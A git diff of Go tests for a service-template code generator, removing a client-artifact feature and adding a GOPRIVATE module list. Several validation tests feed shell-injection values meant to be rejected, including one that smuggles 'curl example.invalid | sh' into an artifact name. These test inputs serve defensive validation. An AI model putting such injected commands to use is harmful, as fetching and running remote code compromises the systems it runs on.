@@ -14,15 +14,16 @@ import (
 	"testing"
 )
 
-// goServiceBotConfig describes quirk-backend-discord-bot: one service, two
-// client artifacts, an image pushed to quirk/backend-discord-bot, and the
-// default private module.
+// goServiceBotPrivateModules is the bot's GOPRIVATE list: the service kit and
+// the two sibling repositories whose clients it imports with go get.
+const goServiceBotPrivateModules = "github.com/ALT-F4-LLC/quirk-service-kit,github.com/ALT-F4-LLC/quirk-lambda-ai,github.com/ALT-F4-LLC/quirk-lambda-database"
+
+// goServiceBotConfig describes quirk-backend-discord-bot: one service, an
+// image pushed to quirk/backend-discord-bot, and private modules for the
+// service kit and both client modules.
 func goServiceBotConfig() GoServiceConfig {
 	cfg := NewGoServiceConfig(Config{Name: "quirk-backend-discord-bot", Template: GoServiceName})
-	cfg.Clients = []GoServiceClientConfig{
-		{Name: "ai", Alias: "quirk-lambda-ai-client-go:0.1.0", Output: "internal/client_ai"},
-		{Name: "database", Alias: "quirk-lambda-database-client-go:0.1.0", Output: "internal/client_database"},
-	}
+	cfg.PrivateModules = goServiceBotPrivateModules
 	cfg.Image.Repository = "quirk/backend-discord-bot"
 	return cfg
 }
@@ -44,10 +45,6 @@ func TestGoServiceGeneratesFromBuildConfigsYAML(t *testing.T) {
 	yaml := `name: quirk-backend-discord-bot
 template: go-service
 parameters:
-  clients:
-    - name: ai
-      alias: quirk-lambda-ai-client-go:0.1.0
-      output: internal/client_ai
   image:
     repository: quirk/backend-discord-bot
 `
@@ -96,8 +93,7 @@ parameters:
 }
 
 // Render rejects a config whose names would break the generated shell,
-// collide as Vorpal artifacts, or send `just clients`'s rm -rf outside the
-// repository.
+// or collide as Vorpal artifacts.
 func TestGoServiceRenderRejectsInvalidConfig(t *testing.T) {
 	for _, tc := range []struct {
 		name   string
@@ -109,28 +105,6 @@ func TestGoServiceRenderRejectsInvalidConfig(t *testing.T) {
 		{"uppercase service", func(c *GoServiceConfig) { c.Services = []string{"Bot"} }, "service"},
 		{"service is dev environment", func(c *GoServiceConfig) { c.Services = []string{"demo-dev"} }, "unique"},
 		{"artifact is a service", func(c *GoServiceConfig) { c.Artifacts = []string{"demo"} }, "unique"},
-		{"client parent output", func(c *GoServiceConfig) {
-			c.Clients = []GoServiceClientConfig{{Name: "ai", Alias: "a:1", Output: "../outside"}}
-		}, "output"},
-		{"client dot output", func(c *GoServiceConfig) {
-			c.Clients = []GoServiceClientConfig{{Name: "ai", Alias: "a:1", Output: "."}}
-		}, "output"},
-		{"client absolute output", func(c *GoServiceConfig) {
-			c.Clients = []GoServiceClientConfig{{Name: "ai", Alias: "a:1", Output: "/etc"}}
-		}, "output"},
-		{"client output twice", func(c *GoServiceConfig) {
-			c.Clients = []GoServiceClientConfig{{Name: "ai", Alias: "a:1", Output: "internal/c"}, {Name: "db", Alias: "b:1", Output: "internal/c"}}
-		}, "overlaps client output"},
-		{"client alias without version", func(c *GoServiceConfig) {
-			c.Clients = []GoServiceClientConfig{{Name: "ai", Alias: "client", Output: "internal/c"}}
-		}, "alias"},
-		{"client alias with quote", func(c *GoServiceConfig) {
-			c.Clients = []GoServiceClientConfig{{Name: "ai", Alias: `a:1"`, Output: "internal/c"}}
-		}, "alias"},
-		{"client name collides", func(c *GoServiceConfig) {
-			c.Services = []string{"demo-client-ai"}
-			c.Clients = []GoServiceClientConfig{{Name: "ai", Alias: "a:1", Output: "internal/c"}}
-		}, "unique"},
 		{"image repository uppercase", func(c *GoServiceConfig) { c.Image.Repository = "Quirk/Bot" }, "image.repository"},
 		{"image repository with host", func(c *GoServiceConfig) { c.Image.Repository = "registry:5000/bot" }, "image.repository"},
 		{"image rootfs", func(c *GoServiceConfig) { c.Image.Repository = "quirk/bot"; c.Image.Rootfs = "" }, "image.rootfs"},
@@ -139,38 +113,13 @@ func TestGoServiceRenderRejectsInvalidConfig(t *testing.T) {
 			c.Services = []string{"demo-image"}
 		}, "unique"},
 		{"generate newline", func(c *GoServiceConfig) { c.Generate = []string{"a\nb"} }, "newline"},
-		{"client output is Cmd", func(c *GoServiceConfig) {
-			c.Clients = []GoServiceClientConfig{{Name: "ai", Alias: "a:1", Output: "Cmd"}}
-		}, "overlaps cmd"},
-		{"client output trailing slash", func(c *GoServiceConfig) {
-			c.Clients = []GoServiceClientConfig{{Name: "ai", Alias: "a:1", Output: "internal/c/"}}
-		}, "trailing slash"},
-		{"client output empty segment", func(c *GoServiceConfig) {
-			c.Clients = []GoServiceClientConfig{{Name: "ai", Alias: "a:1", Output: "internal//c"}}
-		}, "empty segment"},
-		{"name with quote and clients", func(c *GoServiceConfig) {
+		{"name with quote", func(c *GoServiceConfig) {
 			c.Name = "x'; touch pwned; echo '"
 			c.Services = []string{"svc"}
-			c.Clients = []GoServiceClientConfig{{Name: "ai", Alias: "a:1", Output: "internal/c"}}
 		}, "name"},
 		{"artifact with quote", func(c *GoServiceConfig) { c.Artifacts = []string{`x"; curl example.invalid | sh; echo "`} }, "artifact"},
 		{"privateModules with quote", func(c *GoServiceConfig) { c.PrivateModules = `github.com/x",evil:"` }, "privateModules"},
 		{"privateModules with space", func(c *GoServiceConfig) { c.PrivateModules = "github.com/x github.com/y" }, "privateModules"},
-		{"client output is cmd", func(c *GoServiceConfig) {
-			c.Clients = []GoServiceClientConfig{{Name: "ai", Alias: "a:1", Output: "cmd"}}
-		}, "overlaps cmd"},
-		{"client output inside cmd", func(c *GoServiceConfig) {
-			c.Clients = []GoServiceClientConfig{{Name: "ai", Alias: "a:1", Output: "cmd/vorpal"}}
-		}, "overlaps cmd"},
-		{"client output is dist", func(c *GoServiceConfig) {
-			c.Clients = []GoServiceClientConfig{{Name: "ai", Alias: "a:1", Output: "dist"}}
-		}, "overlaps dist"},
-		{"client output is go.mod", func(c *GoServiceConfig) {
-			c.Clients = []GoServiceClientConfig{{Name: "ai", Alias: "a:1", Output: "go.mod"}}
-		}, "overlaps go.mod"},
-		{"client outputs nested", func(c *GoServiceConfig) {
-			c.Clients = []GoServiceClientConfig{{Name: "ai", Alias: "a:1", Output: "internal/c"}, {Name: "db", Alias: "b:1", Output: "internal/c/db"}}
-		}, "overlaps client output"},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
 			t.Chdir(t.TempDir())
@@ -208,10 +157,10 @@ func goServiceProgramStrings(t *testing.T) []string {
 	return lits
 }
 
-// The Vorpal program builds each service from cmd/<name> without cgo, wraps
-// each client alias in its own artifact, excludes client outputs from the
-// source, and builds the image from the rootfs alias on Linux only.
-func TestGoServiceVorpalProgramBuildsServicesClientsAndImage(t *testing.T) {
+// The Vorpal program builds each service from cmd/<name> without cgo, passes
+// the GOPRIVATE list to the build, excludes dist from the source, and builds
+// the image from the rootfs alias on Linux only.
+func TestGoServiceVorpalProgramBuildsServicesAndImage(t *testing.T) {
 	goServiceRender(t, goServiceBotConfig())
 	src := goLambdaReadFile(t, "cmd/vorpal/main.go")
 	lits := goServiceProgramStrings(t)
@@ -219,19 +168,13 @@ func TestGoServiceVorpalProgramBuildsServicesClientsAndImage(t *testing.T) {
 	for _, want := range []string{
 		"quirk-backend-discord-bot",
 		"quirk-backend-discord-bot-dev",
-		"quirk-backend-discord-bot-client-ai",
-		"quirk-lambda-ai-client-go:0.1.0",
-		"internal/client_ai",
-		"quirk-backend-discord-bot-client-database",
-		"quirk-lambda-database-client-go:0.1.0",
-		"internal/client_database",
 		"quirk-backend-discord-bot-image",
 		"linux-vorpal:latest",
 		"-linux",
 		"CGO_ENABLED=0",
 		"-ldflags='-s -w'",
 		"dist",
-		"GOPRIVATE=github.com/ALT-F4-LLC/quirk-service-kit",
+		"GOPRIVATE=" + goServiceBotPrivateModules,
 	} {
 		if !slices.Contains(lits, want) {
 			t.Errorf("cmd/vorpal/main.go has no string literal %q", want)
@@ -240,7 +183,6 @@ func TestGoServiceVorpalProgramBuildsServicesClientsAndImage(t *testing.T) {
 	for _, want := range []string{
 		"artifact.NewOciImage(",
 		"strings.HasSuffix(ctx.GetTargetStr(), \"-linux\")",
-		"builder.WithArtifacts(clientArtifacts)",
 		"credentialed = services",
 	} {
 		if !strings.Contains(src, want) {
@@ -255,7 +197,7 @@ func TestGoServiceVorpalProgramBuildsServicesClientsAndImage(t *testing.T) {
 	}
 }
 
-// Without an image, clients, or private modules, the program carries none of
+// Without an image or private modules, the program carries none of
 // their code.
 func TestGoServiceVorpalProgramOmitsUnusedFeatures(t *testing.T) {
 	cfg := NewGoServiceConfig(Config{Name: "demo", Template: GoServiceName})
@@ -263,22 +205,18 @@ func TestGoServiceVorpalProgramOmitsUnusedFeatures(t *testing.T) {
 	goServiceRender(t, cfg)
 	src := goLambdaReadFile(t, "cmd/vorpal/main.go")
 	goServiceProgramStrings(t)
-	for _, absent := range []string{"NewOciImage", "wrapClient", "privateModuleSandbox", "readNetrc", "GOPRIVATE", `"strings"`, `"os"`} {
+	for _, absent := range []string{"NewOciImage", "privateModuleSandbox", "readNetrc", "GOPRIVATE", `"strings"`, `"os"`} {
 		if strings.Contains(src, absent) {
 			t.Errorf("cmd/vorpal/main.go contains %q without the feature that needs it", absent)
 		}
 	}
 }
 
-// The justfile copies clients before check, packages the image into dist/,
-// and pushes the tarball it wrote.
+// The justfile packages the image into dist/ and pushes the tarball it wrote.
 func TestGoServiceJustfileRecipes(t *testing.T) {
 	goServiceRender(t, goServiceBotConfig())
 	src := goLambdaReadFile(t, "justfile")
 	for _, want := range []string{
-		"check: clients\n",
-		"rm -rf 'internal/client_ai'\n",
-		`cp -R "$(vorpal build --path 'quirk-backend-discord-bot-client-ai')/." 'internal/client_ai'`,
 		"OUTPUT=$(vorpal build --path 'quirk-backend-discord-bot-image')",
 		`install -m 0644 "$OUTPUT/image.tar" 'dist/quirk-backend-discord-bot-image/image.tar'`,
 		"push registry tag=`git rev-parse HEAD`:",
@@ -295,7 +233,7 @@ func TestGoServiceJustfileRecipes(t *testing.T) {
 	cfg := NewGoServiceConfig(Config{Name: "demo", Template: GoServiceName})
 	goServiceRender(t, cfg)
 	src = goLambdaReadFile(t, "justfile")
-	for _, absent := range []string{"clients:", "package-image:", "push ", "generate:"} {
+	for _, absent := range []string{"package-image:", "push ", "generate:"} {
 		if strings.Contains(src, absent) {
 			t.Errorf("default justfile contains %q", absent)
 		}
@@ -306,17 +244,14 @@ func TestGoServiceJustfileRecipes(t *testing.T) {
 }
 
 // The rendered Vorpal program is gofmt-clean for every combination of
-// clients, image, private modules, extension, script and includes.
+// image, private modules, extension, script and includes.
 func TestGoServiceVorpalProgramGofmtClean(t *testing.T) {
 	for name, mutate := range map[string]func(*GoServiceConfig){
 		"default":                func(*GoServiceConfig) {},
 		"bot":                    func(c *GoServiceConfig) { *c = goServiceBotConfig() },
 		"no private modules":     func(c *GoServiceConfig) { c.PrivateModules = "" },
 		"bot no private modules": func(c *GoServiceConfig) { *c = goServiceBotConfig(); c.PrivateModules = "" },
-		"image without clients":  func(c *GoServiceConfig) { c.Image.Repository = "quirk/x" },
-		"clients without image": func(c *GoServiceConfig) {
-			c.Clients = []GoServiceClientConfig{{Name: "ai", Alias: "a:1", Output: "internal/c"}}
-		},
+		"image only":             func(c *GoServiceConfig) { c.Image.Repository = "quirk/x" },
 		"no tools": func(c *GoServiceConfig) {
 			c.Vorpal.ExcludeTools = []string{"golangci-lint", "govulncheck", "jq", "just", "gitleaks", "rumdl"}
 		},
